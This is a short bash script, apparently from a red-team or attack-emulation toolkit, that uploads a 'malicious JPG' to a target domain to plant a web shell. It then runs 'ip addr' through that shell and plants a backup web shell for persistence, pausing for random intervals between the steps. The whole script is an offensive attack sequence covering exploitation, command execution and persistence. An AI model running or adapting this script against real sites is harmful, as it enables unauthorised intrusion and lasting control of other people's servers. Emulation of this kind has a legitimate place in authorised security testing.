#!/bin/bash

echo "Loading configs/$1"
source configs/$1

echo "Uploading malicious JPG ..."
python3 util/shell.py exploit https://$TARGET_DOMAIN $EXPLOIT_JPG $EXPLOIT_WEBSHELL_NAME $TARGET_WEBSHELL

echo "done."

attack_wait $(shuf -i 0-20 -n 1)s

echo "Testing web shell ..."
python3 util/shell.py exec $TARGET_WEBSHELL ip addr

echo "done."

attack_wait $(shuf -i 0-20 -n 1)s

echo "Uploading backup webshell ..."
python3 util/shell.py upload $TARGET_WEBSHELL $BACKUP_WEBSHELL $BACKUP_WEBSHELL_NAME 

echo "https://$TARGET_DOMAIN/$BACKUP_WEBSHELL_PATH" > $TARGET_BACKUP_WEBSHELL

echo "done."


